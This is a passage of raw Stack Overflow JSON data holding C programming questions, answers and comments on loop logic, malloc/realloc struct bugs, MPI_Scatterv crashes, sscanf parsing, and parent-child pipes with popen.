attempts is %.2f \\n\", num1, average_1);\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 11, "user_id": 3328825, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/6LH2I.png?s=128&g=1", "display_name": "Tony Lyu", "link": "https://stackoverflow.com/users/3328825/tony-lyu"}, "is_accepted": false, "score": 0, "last_activity_date": 1444839762, "creation_date": 1444839762, "answer_id": 33130669, "question_id": 33130295, "link": "https://stackoverflow.com/questions/33130295/c-program-gives-incorrect-output/33130669#33130669", "title": "C program gives incorrect output?", "body": "<p>after the while loop, your num1 will be 0.</p>\n"}], "owner": {"reputation": 81, "user_id": 5442643, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/297e2eaaa08461343ea526c6764d1f85?s=128&d=identicon&r=PG&f=1", "display_name": "Batool", "link": "https://stackoverflow.com/users/5442643/batool"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 137, "favorite_count": 0, "accepted_answer_id": 33130444, "answer_count": 6, "score": 0, "last_activity_date": 1445268628, "creation_date": 1444838795, "last_edit_date": 1444840642, "question_id": 33130295, "link": "https://stackoverflow.com/questions/33130295/c-program-gives-incorrect-output", "title": "C program gives incorrect output?", "body": "<p>I am writing a C program which calculates average grade and tells if you pass or fail. The user can choose as many attempts as they want and they will be given a final average of all attempts. Here is my code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main(void)\n{\n    int num1;\n    double num2, num3, average, average_1;\n\n    printf(\"Enter number of attempts: \");\n    scanf(\"%d\", &amp;num1);\n\n    while (num1 &gt; 0) {\n        printf(\"Enter your mark for subject one: \");\n        scanf(\"%lf\", &amp;num2);\n\n        printf(\"Enter your mark for subject two: \");\n        scanf(\"%lf\", &amp;num3);\n\n        if (num2 &lt; 50 || num3 &lt; 50) {\n            printf(\"You have failed \\n\");\n        } else {\n            printf(\"You have passed \\n\");\n        }\n\n        num1--;\n    }\n\n    average = num1 * num2 * num3;\n    average_1 = average / 100;\n\n    printf(\"Average for all %d attempts is %.2f \\n\", num1, average_1);\n}\n</code></pre>\n\n<p>The problem with this code is that the final output, which is the last printf line, gives me 0 for attempts and 0 for average. Here is the exact output:</p>\n\n<pre>\nEnter number of attempts: 2\nEnter your mark for subject one: 49\nEnter your mark for subject two: 96\nYou have failed\nEnter your mark for subject one: 22\nEnter your mark for subject two: 100\nYou have failed\nAverage for all 0 attempts is 0.00\n</pre>\n"}, {"tags": ["c", "struct"], "answers": [{"comments": [{"owner": {"reputation": 2153, "user_id": 4764736, "user_type": "registered", "accept_rate": 90, "profile_image": "https://graph.facebook.com/1423363884633192/picture?type=large", "display_name": "DawidPi", "link": "https://stackoverflow.com/users/4764736/dawidpi"}, "edited": false, "score": 1, "creation_date": 1444839143, "post_id": 33130312, "comment_id": 54072624, "body": "I don&#39;t understand what You mean? It gives rubbish ok, but he is not using pointer <code>CreateString</code> before assigning to it. He assigns pointer to the function just after <code>malloc</code>"}, {"owner": {"reputation": 188394, "user_id": 541686, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/f2d0d2c0f7a83e2f8797a5ae79a324b6?s=128&d=identicon&r=PG", "display_name": "user541686", "link": "https://stackoverflow.com/users/541686/user541686"}, "reply_to_user": {"reputation": 2153, "user_id": 4764736, "user_type": "registered", "accept_rate": 90, "profile_image": "https://graph.facebook.com/1423363884633192/picture?type=large", "display_name": "DawidPi", "link": "https://stackoverflow.com/users/4764736/dawidpi"}, "edited": false, "score": 1, "creation_date": 1444839889, "post_id": 33130312, "comment_id": 54073089, "body": "@DawidPi: I&#39;m talking about <code>s</code>, not <code>CreateString</code>."}], "tags": [], "owner": {"reputation": 188394, "user_id": 541686, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/f2d0d2c0f7a83e2f8797a5ae79a324b6?s=128&d=identicon&r=PG", "display_name": "user541686", "link": "https://stackoverflow.com/users/541686/user541686"}, "is_accepted": false, "score": 3, "last_activity_date": 1444838834, "creation_date": 1444838834, "answer_id": 33130312, "question_id": 33130277, "link": "https://stackoverflow.com/questions/33130277/dynamically-resizing-a-struct-in-c/33130312#33130312", "title": "Dynamically resizing a struct in C", "body": "<p><code>malloc</code> does not zero its memory; it returns garbage, so you get an invalid pointer inside this <code>struct</code>:</p>\n\n<pre><code>struct TestClass* m = malloc((sizeof(struct TestClass)));\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "is_accepted": false, "score": 1, "last_activity_date": 1444839893, "creation_date": 1444839893, "answer_id": 33130719, "question_id": 33130277, "link": "https://stackoverflow.com/questions/33130277/dynamically-resizing-a-struct-in-c/33130719#33130719", "title": "Dynamically resizing a struct in C", "body": "<p>You are short by <code>1-byte</code>. You need to add <code>1</code> to <code>m-&gt;size</code> for the null-terminator if you intend to copy <code>str</code> to <code>m-&gt;s</code>. E.g.:</p>\n\n<pre><code>void TestClassCreateString(struct TestClass *m, char* str) \n{\n    char *buf;\n    m-&gt;size = strlen(str);\n\n    if (!m-&gt;size) \n    {\n        free(m-&gt;s);\n        m-&gt;s = malloc(16);\n    } \n    else \n    {\n        buf = realloc(m-&gt;s, m-&gt;size + 1);\n        if (buf) m-&gt;s = buf;\n        strncpy (m-&gt;s, str, m-&gt;size + 1);\n    }\n}\n</code></pre>\n\n<p>Then you can do something like:</p>\n\n<pre><code>int main() \n{\n    struct TestClass* fizz = TestClassCreate();\n    fizz-&gt;CreateString(fizz,\"Hello World\");\n    printf (\"\\n fizz-&gt;s : %s\\n\\n\", fizz-&gt;s);\n    free(fizz);\n    return 0;\n}\n</code></pre>\n\n<p>and get:</p>\n\n<pre><code>$ ./bin/oo_struct\n\n fizz-&gt;s : Hello World\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "is_accepted": true, "score": 1, "last_activity_date": 1444856835, "last_edit_date": 1444856835, "creation_date": 1444856469, "answer_id": 33135514, "question_id": 33130277, "link": "https://stackoverflow.com/questions/33130277/dynamically-resizing-a-struct-in-c/33135514#33135514", "title": "Dynamically resizing a struct in C", "body": "<p>When creating a <code>struct TestClass</code> in <code>TestClassCreate()</code> the code misses to properly initialise the freshly allocated <code>struct</code>. </p>\n\n<p>So calling </p>\n\n<pre><code>    free(m-&gt;s);\n</code></pre>\n\n<p>tries to free memory at a random address, which invokes undefined behaviour and typically crashes the program.</p>\n\n<p>To fix this modify the code as follows</p>\n\n<pre><code>struct TestClass* TestClassCreate() \n{\n  struct TestClass* m = ...\n\n  ...\n\n  m-&gt;s = NULL;\n  m-&gt;size = 0;\n  m-&gt;b_size = 0;\n\n  return m;\n}\n</code></pre>\n\n<p>To make things better also add some error checking:</p>\n\n<pre><code>struct TestClass* TestClassCreate() \n{\n  struct TestClass * m = malloc((sizeof(struct TestClass)));\n\n  if (NULL != m)\n  {\n    m-&gt;CreateString = TestClassCreateString;\n    m-&gt;s = NULL;\n    m-&gt;size = 0;\n    m-&gt;b_size = 0;\n  }\n\n  return m;\n}\n</code></pre>\n\n<p>To make the code even more fail-safe apply these last changes:</p>\n\n<pre><code>struct TestClass* TestClassCreate(void) \n{\n  struct TestClass * m = malloc(sizeof *m);\n\n  ...\n</code></pre>\n\n<hr>\n\n<p>Further more the code misses to allocate memory for the C-\"string\"'s <code>0</code>-terminator here:</p>\n\n<pre><code>void TestClassCreateString(struct TestClass *m, char* str) \n{\n\n  ...\n  else \n  {\n    buf = realloc(m-&gt;s, m-&gt;size + 1); /* allocate 1 byte more for the trailing \n                                       `0` marking the end of a C-\"string\". */\n    ...\n</code></pre>\n"}], "owner": {"reputation": 807, "user_id": 1910890, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/9871372bb6d3926c1a7d79add5dad507?s=128&d=identicon&r=PG", "display_name": "headbanger", "link": "https://stackoverflow.com/users/1910890/headbanger"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 343, "favorite_count": 0, "accepted_answer_id": 33135514, "answer_count": 3, "score": 0, "last_activity_date": 1444856835, "creation_date": 1444838721, "question_id": 33130277, "link": "https://stackoverflow.com/questions/33130277/dynamically-resizing-a-struct-in-c", "title": "Dynamically resizing a struct in C", "body": "<p>I'm fiddling around with Object oriented programming in C (note! Not C++ or C# - just plain ol' C).  Right now, I'm trying to dynamically resize a struct (I'm playing with writing a simple String class).  The code builds okay:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nstruct TestClass \n{\n    char *s;\n    size_t size;\n    size_t b_size;\n    void (*CreateString) (struct TestClass*,char*);\n};\n\nvoid TestClassCreateString(struct TestClass *m, char* str) \n{\n    char *buf;\n    m-&gt;size = strlen(str);\n\n    if (!m-&gt;size) \n    {\n        free(m-&gt;s);\n        m-&gt;s = malloc(16);\n    } \n    else \n    {\n        buf = realloc(m-&gt;s, m-&gt;size);\n        if (buf) m-&gt;s = buf;\n    }\n}\n\nstruct TestClass* TestClassCreate() \n{\n    struct TestClass* m = malloc((sizeof(struct TestClass)));\n    m-&gt;CreateString = TestClassCreateString;\n    return m;\n}\n\nint main() \n{\n    struct TestClass* fizz = TestClassCreate();\n    fizz-&gt;CreateString(fizz,\"Hello World\");\n    free(fizz);\n    return 0;\n}\n</code></pre>\n\n<p>\u2026But on running it I get the following error:</p>\n\n<pre><code>malloc: *** error for object 0x5000000000000000: pointer being realloc'd was not allocated\n*** set a breakpoint in malloc_error_break to debug\n</code></pre>\n\n<p>Is anyone able to identify where I've gone wrong?  Thanks in advance!</p>\n"}, {"tags": ["c", "mpi"], "owner": {"reputation": 11, "user_id": 5445902, "user_type": "registered", "profile_image": "https://graph.facebook.com/1227003323992244/picture?type=large", "display_name": "han", "link": "https://stackoverflow.com/users/5445902/han"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 144, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1444855603, "creation_date": 1444838578, "last_edit_date": 1444841772, "question_id": 33130228, "link": "https://stackoverflow.com/questions/33130228/mpi-in-c-scatterv-doesnt-work", "title": "MPI in C : Scatterv doesn&#39;t work", "body": "<p>My <code>MPI_Scatterv</code> doesn't always work. I get an error message </p>\n\n<blockquote>\n  <p>status of rank 0: killed by signal 11.</p>\n</blockquote>\n\n<p>Below is my code:</p>\n\n<pre><code>#include &lt;mpi.h&gt;\n#include &lt;iostream&gt;\n#include &lt;string&gt;\n#include &lt;fstream&gt;\n#include &lt;stdio.h&gt;\n#include &lt;cstring&gt;\n#include &lt;cstdlib&gt;\n#include &lt;math.h&gt;\n#include \"bmp.h\"\nusing namespace std;\n//\u5b9a\u7fa9\u5e73\u6ed1\u904b\u7b97\u7684\u6b21\u6578\n#define NSmooth 1000\nBMPHEADER bmpHeader;                        \nBMPINFO bmpInfo;\nRGBTRIPLE **BMPSaveData = NULL;                                               \nRGBTRIPLE **BMPData = NULL;  \nRGBTRIPLE **BMPRecv = NULL;\nint readBMP( char *fileName);        //read file\nint saveBMP( char *fileName);        //save file\nvoid swap(RGBTRIPLE *a, RGBTRIPLE *b);\nRGBTRIPLE **alloc_memory( int Y, int X );        //allocate memory\nint main(int argc,char *argv[])\n{\nchar *infileName = \"input.bmp\";\nchar *outfileName = \"output2.bmp\";\nint rem, *displs, new_height, width, id, process, sum=0, *sendcounts;\nint count = 3;\nint lengths[3] = {1, 1, 1};\nMPI_Aint offsets[3] = {0, 1, 2};\nMPI_Datatype types[3] = {MPI_BYTE, MPI_BYTE, MPI_BYTE};\nMPI_Datatype datatype;\nMPI_Init(&amp;argc,&amp;argv);\nMPI_Comm_rank(MPI_COMM_WORLD, &amp;id);\nMPI_Comm_size(MPI_COMM_WORLD, &amp;process);\nMPI_Type_struct(count, lengths, offsets, types, &amp;datatype);\nMPI_Type_commit(&amp;datatype);\ndouble startwtime = 0.0, endwtime=0;\nstartwtime = MPI_Wtime();\nif(id == 0)\n{\n\n        if ( readBMP( infileName) )\n        {\n            cout &lt;&lt; \"Read file successfully!!\" &lt;&lt; endl;\n            rem = (bmpInfo.biHeight*bmpInfo.biWidth)%process;\n            new_height = bmpInfo.biHeight / process;\n            width = bmpInfo.biWidth;\n        }\n        else\n        {\n            cout &lt;&lt; \"Read file fails!!\" &lt;&lt; endl;\n            MPI_Finalize();\n            return 0;\n        }      \n}\nMPI_Bcast(&amp;rem, 1, MPI_INT, 0, MPI_COMM_WORLD);\nMPI_Bcast(&amp;new_height, 1, MPI_INT, 0, MPI_COMM_WORLD);\nMPI_Bcast(&amp;width, 1, MPI_INT, 0, MPI_COMM_WORLD);\nsendcounts = (int *)malloc(sizeof(int ) *process);\ndispls = (int *)malloc(sizeof(int ) *process);\nfor (int i =0; i &lt; process; i++)\n{\n    sendcounts[i] = new_height*width;\n    if (rem &gt; 0)\n    {\n        sendcounts[i]++;\n        rem--;\n    }\n    displs[i] = sum;\n    sum += sendcounts[i];\n}\nBMPRecv = alloc_memory(new_height, width);\n\n#####MPI_Scatterv(&amp;BMPSaveData, sendcounts, displs, datatype, &amp;BMPRecv,   (new_height*width), datatype, 0, MPI_COMM_WORLD);\nBMPData = alloc_memory(new_height, width);\nfor(int count = 0; count &lt; NSmooth ; count ++)\n{\n\n        swap(BMPRecv,BMPData);\n\n        for(int i = 0; new_height ; i++)\n        {\n            for(int j =0; j&lt;width ; j++)\n            {\n\n                int Top = i&gt;0 ? i-1 : new_height-1;\n                int Down = i&lt;new_height-1 ? i+1 : 0;\n                int Left = j&gt;0 ? j-1 : width-1;\n                int Right = j&lt;width-1 ? j+1 : 0;\n\n                BMPRecv[i][j].rgbBlue =  (double) (BMPData[i][j].rgbBlue+BMPData[Top][j].rgbBlue+BMPData[Down][j].rgbBlue+BMPData[i][Left].rgbBlue+BMPData[i][Right].rgbBlue)/5+0.5;\n                BMPRecv[i][j].rgbGreen =  (double) (BMPData[i][j].rgbGreen+BMPData[Top][j].rgbGreen+BMPData[Down][j].rgbGreen+BMPData[i][Left].rgbGreen+BMPData[i][Right].rgbGreen)/5+0.5;\n                BMPRecv[i][j].rgbRed =  (double) (BMPData[i][j].rgbRed+BMPData[Top][j].rgbRed+BMPData[Down][j].rgbRed+BMPData[i][Left].rgbRed+BMPData[i][Right].rgbRed)/5+0.5;\n            }\n        }\n}\nMPI_Gatherv(&amp;BMPRecv, (new_height*width), datatype, &amp;BMPSaveData, sendcounts, displs, datatype, 0,MPI_COMM_WORLD);\nif (id == 0)\n{\n    if ( saveBMP( outfileName ) )\n    {\n        cout &lt;&lt; \"Save file successfully!!\" &lt;&lt; endl;\n    }\n    else\n    {\n        cout &lt;&lt; \"Save file fails!!\" &lt;&lt; endl;\n    }   \n    endwtime = MPI_Wtime();\n    cout &lt;&lt; \"The execution time = \"&lt;&lt; endwtime-startwtime &lt;&lt;endl ;\n}\n    free(BMPData);\n    free(BMPSaveData);\n    free(BMPRecv);\n    MPI_Finalize();\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "string", "scanf"], "comments": [{"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1444838582, "post_id": 33130170, "comment_id": 54072259, "body": "can;t you use <code>strrchr()</code>?"}, {"owner": {"reputation": 14429, "user_id": 3494013, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/ff6b6de2f59471e271413f74921e054a?s=128&d=identicon&r=PG&f=1", "display_name": "cadaniluk", "link": "https://stackoverflow.com/users/3494013/cadaniluk"}, "edited": false, "score": 1, "creation_date": 1444838632, "post_id": 33130170, "comment_id": 54072292, "body": "<a href=\"http://stackoverflow.com/questions/9219940/traversing-c-string-get-the-last-word-of-a-string\" title=\"traversing c string get the last word of a string\">stackoverflow.com/questions/9219940/&hellip;</a> would do it."}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "reply_to_user": {"reputation": 14429, "user_id": 3494013, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/ff6b6de2f59471e271413f74921e054a?s=128&d=identicon&r=PG&f=1", "display_name": "cadaniluk", "link": "https://stackoverflow.com/users/3494013/cadaniluk"}, "edited": false, "score": 0, "creation_date": 1444838694, "post_id": 33130170, "comment_id": 54072339, "body": "@cad thanks for the link."}, {"owner": {"reputation": 15, "user_id": 5271619, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/68ca0d6ba0bf68b86bcf84473abcc210?s=128&d=identicon&r=PG&f=1", "display_name": "Jack Johnson", "link": "https://stackoverflow.com/users/5271619/jack-johnson"}, "edited": false, "score": 0, "creation_date": 1444839068, "post_id": 33130170, "comment_id": 54072572, "body": "is there a way to do it using sscanf, i havent learnt strchr"}], "owner": {"reputation": 15, "user_id": 5271619, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/68ca0d6ba0bf68b86bcf84473abcc210?s=128&d=identicon&r=PG&f=1", "display_name": "Jack Johnson", "link": "https://stackoverflow.com/users/5271619/jack-johnson"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 92, "favorite_count": 0, "closed_date": 1444838682, "answer_count": 0, "score": 0, "last_activity_date": 1444839382, "creation_date": 1444838407, "last_edit_date": 1444839382, "question_id": 33130170, "link": "https://stackoverflow.com/questions/33130170/how-to-sscanf-only-the-last-word-from-a-string", "closed_reason": "Duplicate", "title": "How to sscanf only the last word from a string?", "body": "<p>I have a string ive read from a file using fgets and want to only scan the last word in that string.\nFor example if my string is</p>\n\n<pre><code>Hello my name is fred\n</code></pre>\n\n<p>I would only want to read the word 'fred' </p>\n\n<p>I know i could just use <code>sscanf(\"%s %s %s %s %s\", . . . . . .)</code> but that seems unnecessary as i only need the last value. Can this be done using sscanf?</p>\n"}, {"tags": ["c", "pipe", "exec", "parent-child", "ipc"], "comments": [{"owner": {"reputation": 168120, "user_id": 102937, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/1233ec65168f4aae4d939ae8fe6cde1e?s=128&d=identicon&r=PG", "display_name": "Robert Harvey", "link": "https://stackoverflow.com/users/102937/robert-harvey"}, "edited": false, "score": 0, "creation_date": 1444839728, "post_id": 33129782, "comment_id": 54072990, "body": "<a href=\"https://www.cs.cf.ac.uk/Dave/C/node33.html\" rel=\"nofollow noreferrer\">cs.cf.ac.uk/Dave/C/node33.html</a>"}, {"owner": {"reputation": 13866, "user_id": 54200, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/6261c8ab215b8069e8290516c80445d8?s=128&d=identicon&r=PG", "display_name": "KevinDTimm", "link": "https://stackoverflow.com/users/54200/kevindtimm"}, "reply_to_user": {"reputation": 54872, "user_id": 1521179, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/MH7pk.png?s=128&g=1", "display_name": "amon", "link": "https://stackoverflow.com/users/1521179/amon"}, "edited": false, "score": 0, "creation_date": 1444850300, "post_id": 33129782, "comment_id": 54079108, "body": "I think I jumped the gun and will gladly remove my comments - which will make @amon&#39;s appear rather odd. Glad to see you got an answer."}, {"owner": {"reputation": 13866, "user_id": 54200, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/6261c8ab215b8069e8290516c80445d8?s=128&d=identicon&r=PG", "display_name": "KevinDTimm", "link": "https://stackoverflow.com/users/54200/kevindtimm"}, "reply_to_user": {"reputation": 54872, "user_id": 1521179, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/MH7pk.png?s=128&g=1", "display_name": "amon", "link": "https://stackoverflow.com/users/1521179/amon"}, "edited": false, "score": 0, "creation_date": 1444850394, "post_id": 33129782, "comment_id": 54079157, "body": "@amon - I&#39;m removing my comments (see comment above)"}, {"owner": {"reputation": 365, "user_id": 4052279, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/c8946b98c1692c0dbc68829b2dc5d105?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Ricci", "link": "https://stackoverflow.com/users/4052279/andrew-ricci"}, "edited": false, "score": 0, "creation_date": 1444858318, "post_id": 33129782, "comment_id": 54083453, "body": "Thanks kevin. No worries. I will be removing mine as well."}], "answers": [{"comments": [{"owner": {"reputation": 365, "user_id": 4052279, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/c8946b98c1692c0dbc68829b2dc5d105?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Ricci", "link": "https://stackoverflow.com/users/4052279/andrew-ricci"}, "edited": false, "score": 0, "creation_date": 1444840563, "post_id": 33129859, "comment_id": 54073460, "body": "Thanks, your answer was what I needed. Thank you. I like the way you simplified the parent-child to have to not look as messy as I originally thought."}], "tags": [], "owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "is_accepted": true, "score": 2, "last_activity_date": 1444838059, "last_edit_date": 1444838059, "creation_date": 1444837446, "answer_id": 33129859, "question_id": 33129782, "link": "https://stackoverflow.com/questions/33129782/using-pipe-after-child-calls-exec/33129859#33129859", "title": "Using pipe() after child calls exec()", "body": "<p>The standard scenario is to have the program executed as a child be agnostic of the pipe and just use <code>stdin</code> / <code>stdout</code>. You achieve this by <code>dup2()</code>ing the respective end of the pipe as fd <code>0</code> or <code>1</code> (or both with two pipes for bidirectional communication), corresponding to <code>STDIN_FILENO</code> and <code>STDOUT_FILENO</code>. After this, exec your child program.</p>\n\n<p>Of course, there are alternatives like e.g. \"named pipes\" if you need <code>stdin</code> / <code>stdout</code> for a different purpose in the child.</p>\n\n<p>Still if you write both parts yourself, you might want to think about simpler solutions:</p>\n\n<blockquote>\n  <p>Differentiating between child and parent through if statements is messy as fudge.</p>\n</blockquote>\n\n<p>You have to do this anyways, at least for wiring up the pipes and calling exec(). Just create separate code files and call things like <code>parent_main()</code> and <code>child_main()</code> as appropriate (whatever you like to call them).</p>\n"}, {"tags": [], "owner": {"reputation": 657, "user_id": 5440452, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/609964d12cea609c4df487ccd4ae1f73?s=128&d=identicon&r=PG&f=1", "display_name": "hexasoft", "link": "https://stackoverflow.com/users/5440452/hexasoft"}, "is_accepted": false, "score": 0, "last_activity_date": 1444837837, "last_edit_date": 1444837837, "creation_date": 1444837674, "answer_id": 33129929, "question_id": 33129782, "link": "https://stackoverflow.com/questions/33129782/using-pipe-after-child-calls-exec/33129929#33129929", "title": "Using pipe() after child calls exec()", "body": "<p>After exec*() functions the child shares all the file descriptors of the parent process. So if you create a pipe before fork() you have access to read/write fd in both of them.</p>\n\n<p>Usual method is:</p>\n\n<ul>\n<li>create a pipe (a read fd, a write fd)</li>\n<li>fork()</li>\n<li>in parent:\n\n<ul>\n<li>close read fd (you will not read from parent here)</li>\n<li>write data into write fd</li>\n<li>wait/die</li>\n</ul></li>\n<li>in child:\n\n<ul>\n<li>close write fd (you will not write from child)</li>\n<li>read data from read fd</li>\n<li>wait/die</li>\n</ul></li>\n</ul>\n\n<p>Can't see why you want to exec a new process. If really needed you have to use standard stdin/stdout (see other answer) or have a program that will accept a fd (filedescriptor, an integer) as parameter in order to know which one is the pipe. Don't seems very nice to me.</p>\n"}, {"tags": [], "owner": {"reputation": 5339, "user_id": 1714692, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/bd72cbc200eb7c9aa507624f154b21a7?s=128&d=identicon&r=PG", "display_name": "Francesco Boi", "link": "https://stackoverflow.com/users/1714692/francesco-boi"}, "is_accepted": false, "score": 0, "last_activity_date": 1549367448, "creation_date": 1549367448, "answer_id": 54533781, "question_id": 33129782, "link": "https://stackoverflow.com/questions/33129782/using-pipe-after-child-calls-exec/54533781#54533781", "title": "Using pipe() after child calls exec()", "body": "<p>Actually it is much easier to do it with <a href=\"http://pubs.opengroup.org/onlinepubs/009695399/functions/popen.html\" rel=\"nofollow noreferrer\"><code>popen</code></a> which manages the communication channels automatically</p>\n\n<blockquote>\n  <p><code>FILE *popen(const char *command, const char *mode);</code>\n  The popen() function shall execute the command specified by the string\n  command. It shall create a pipe between the calling program and the\n  executed command, and shall return a pointer to a stream that can be\n  used to either read from or write to the pipe.</p>\n  \n  <p>The environment of the executed command shall be as if a child process\n  were created within the popen() call using the fork() function, and\n  the child invoked the sh utility using the call:</p>\n  \n  <p>execl(shell path, \"sh\", \"-c\", command, (char *)0);</p>\n  \n  <p>where shell path is an unspecified pathname for the sh utility.</p>\n  \n  <p>The popen() function shall ensure that any streams from previous\n  popen() calls that remain open in the parent process are closed in the\n  new child process.</p>\n  \n  <p>The mode argument to popen() is a string that specifies I/O mode:</p>\n  \n  <p>If mode is r, when the child process is started, its file descriptor\n  STDOUT_FILENO shall be the writable end of the pipe, and the file\n  descriptor fileno(stream) in the calling process, where stream is the\n  stream pointer returned by popen(), shall be the readable end of the\n  pipe.</p>\n  \n  <p>If mode is w, when the child process is started its file descriptor\n  STDIN_FILENO shall be the readable end of the pipe, and the file\n  descriptor fileno(stream) in the calling process, where stream is the\n  stream pointer returned by popen(), shall be the writable end of the\n  pipe.</p>\n  \n  <p>If mode is any other value, the result is undefined.</p>\n  \n  <p>After popen(), both the parent and the child process shall be capable\n  of executing independently before either terminates.</p>\n  \n  <p>Pipe streams are byte-oriented.</p>\n  \n  <p>RETURN VALUE</p>\n  \n  <p>Upon successful completion, popen() shall return a pointer to an open\n  stream that can be used to read or write to the pipe. Otherwise, it\n  shall return a null pointer and may set errno to indicate the error.</p>\n</blockquote>\n\n<p>For example suppose you want to send <code>Hello world</code> to the child:</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\nint main()\n{\n  FILE* toChild;\n  toChild = popen(\"./child\", \"w\");//child is executable of the other file: change the name\n  int res = fputs( \"Hello World\\n\", toChild);\n  pclose(toChild);\n  return 0;\n}\n</code></pre>\n\n<p>and the child:</p>\n\n<pre><code>int main()\n{\n  char p[100];\n  int n;\n  do{\n    n = scanf(\"%s\", p);\n    if (n&gt;0) {\n    printf(\"INPUT MESSAGE: \\\"%s\\n\\\"\", p);\n    //free(p);\n    }\n    else {\n      printf( \"%d, No matching characters\\n\", n);\n    }\n  }while(n&gt;0);\n  return 0;\n}\n</code></pre>\n\n<p>You can also use <code>scanf(\"%ms\", &amp;p)</code> with <code>char* p</code> and then <code>free(p)</code> if you are on a pure POSIX system (not on OSX).</p>\n"}], "owner": {"reputation": 365, "user_id": 4052279, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/c8946b98c1692c0dbc68829b2dc5d105?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Ricci", "link": "https://stackoverflow.com/users/4052279/andrew-ricci"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1305, "favorite_count": 1, "accepted_answer_id": 33129859, "answer_count": 3, "score": 2, "last_activity_date": 1549367448, "creation_date": 1444837224, "last_edit_date": 1549364939, "question_id": 33129782, "link": "https://stackoverflow.com/questions/33129782/using-pipe-after-child-calls-exec", "title": "Using pipe() after child calls exec()", "body": "<p>My end goal is to have a parent process pass lines of text to the child, then the child process will print the text to stdout. The child is to run \"permanently\" in the back ground while the parent gets user input and pass's it to the child. I prefer the child in a separate program. Differentiating between child and paretn through if statements is messy as fudge. </p>\n\n<p>I was looking into pipes but I'm unsure if it's even possible for pipes to communicate between a parent/child after the child has called <code>exec()</code> to a different program. </p>\n\n<p>Is this possible? If so, is there any example you can point me to? If not, what method of IPC can I use in that case?</p>\n"}, {"tags": ["c", "twitter-bootstrap"], "comments": [{"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1444838535, "post_id": 33129684, "comment_id": 54072231, "body": "so, the error messages say that some service is not started.  So start that service, then try running your application again."}, {"owner": {"reputation": 97, "user_id": 3173605, "user_type": "registered", "accept_rate": 57, "profile_image": "https://graph.facebook.com/100001500933632/picture?type=large", "display_name": "Maxim", "link": "https://stackoverflow.com/users/3173605/maxim"}, "reply_to_user": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1444903318, "post_id": 33129684, "comment_id": 54100651, "body": "@user3629249 What do you mean by &#39;start the service&#39;?"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1444927238, "post_id": 33129684, 